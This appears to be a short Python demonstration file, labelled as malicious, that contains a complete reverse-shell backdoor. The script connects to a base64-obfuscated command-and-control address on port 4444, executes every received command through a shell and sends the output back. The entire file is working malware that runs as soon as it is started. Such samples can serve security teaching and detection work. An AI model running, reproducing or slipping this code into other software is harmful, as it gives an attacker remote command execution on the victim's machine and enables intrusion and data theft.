#!/usr/bin/env python3
"""
Example: Backdoor with reverse shell
This is MALICIOUS CODE - for demonstration only!
"""

import socket
import subprocess
import os

# Connect back to attacker
def connect_back(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        # Receive command from attacker
        command = s.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
        
        # Execute command
        output = subprocess.check_output(command, shell=True)
        s.send(output)
    
    s.close()

# Obfuscated C2 server
import base64
c2_server = base64.b64decode('MTkyLjE2OC4xLjEwMA==').decode()

# Start backdoor
connect_back(c2_server, 4444)
